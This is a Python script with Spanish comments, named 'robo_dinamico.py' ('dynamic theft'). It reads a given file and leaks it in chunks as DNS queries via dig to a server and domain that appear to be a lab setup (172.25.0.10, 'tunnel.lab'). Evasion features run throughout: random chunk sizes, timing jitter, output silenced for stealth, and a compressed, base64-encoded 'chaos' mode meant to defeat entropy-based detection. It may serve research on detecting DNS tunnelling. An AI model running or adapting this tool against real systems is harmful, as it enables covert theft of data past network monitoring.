import os
import time
import base64
import sys
import random
import zlib  # <--- IMPORTANTE: Necesario para generar el caos binario

# --- CONFIGURACIÓN DE "JITTER" DE TAMAÑO ---
MIN_CHUNK_SIZE = 10
MAX_CHUNK_SIZE = 45   # Reducido un poco porque Base64 expande el tamaño

def exfiltrate_data(payload, server, domain, q_type):
    # Enviamos a /dev/null para sigilo en terminal
    command = f"dig {payload}.{domain} @{server} {q_type} > /dev/null 2>&1"
    os.system(command)

if __name__ == "__main__":
    if len(sys.argv) != 6:
        print("Uso: python3 robo_dinamico.py <archivo> <modo> <min_delay> <max_delay> <tipo>")
        print("Modos: plain | base64 (hex) | chaos (alta entropía)")
        print("Ejemplo: python3 robo_dinamico.py secreto.txt chaos 0.1 0.5 A")
        sys.exit(1)

    FILE = sys.argv[1]
    MODE = sys.argv[2]
    MIN_DELAY = float(sys.argv[3])
    MAX_DELAY = float(sys.argv[4])
    TYPE = sys.argv[5]

    SERVER = "172.25.0.10"
    DOMAIN = "tunnel.lab"

    print(f"[*] Iniciando robo de alta entropía...")
    print(f"[*] Modo: {MODE} | Jitter: {MIN_DELAY}-{MAX_DELAY}s")

    try:
        with open(FILE, "r") as f:
            content = f.read()
            # En modo chaos, no necesitamos limpiar saltos de línea, zlib se los come.
            # Pero para consistencia, los dejamos.
            if MODE != "chaos":
                content = content.replace("\n", ",")

        total_len = len(content)
        current_pos = 0

        while current_pos < total_len:
            # Determinamos tamaño del chunk
            chunk_size = random.randint(MIN_CHUNK_SIZE, MAX_CHUNK_SIZE)
            chunk = content[current_pos : current_pos + chunk_size]
            current_pos += chunk_size

            # --- SELECCIÓN DE CODIFICACIÓN ---

            if MODE == "base64":
                # Mantenemos tu lógica original (que en realidad es Hex/Base16)
                # Entropía máxima: 4.0 bits/char (Baja/Media)
                payload = base64.b16encode(chunk.encode()).decode()

            elif MODE == "chaos":
                # --- MODO ALTA ENTROPÍA (> 4) ---
                # 1. Comprimimos: Convierte texto predecible en ruido binario denso.
                compressed_data = zlib.compress(chunk.encode())

                # 2. Base64 URL Safe: Usamos el set completo de 64 caracteres (A-Z, a-z, 0-9, -, _)
                # Esto permite una entropía de hasta 6 bits por caracter.
                # Usamos urlsafe para evitar '+' y '/' que rompen el DNS.
                payload = base64.urlsafe_b64encode(compressed_data).decode()

                # 3. Quitamos el padding '=' al final porque a veces molesta a dig
                payload = payload.rstrip("=")

            else: # plain
                # Entropía muy baja (texto normal)
                payload = chunk.replace(" ", "_").replace(":", "-")

            # Enviamos
            # Filtro de seguridad por si el chunk quedó vacío
            if payload:
                exfiltrate_data(payload, SERVER, DOMAIN, TYPE)

                # Jitter
                actual_delay = random.uniform(MIN_DELAY, MAX_DELAY)
                time.sleep(actual_delay)

        print(f"[*] Robo finalizado.")

    except Exception as e:
        print(f"[!] Error: {e}")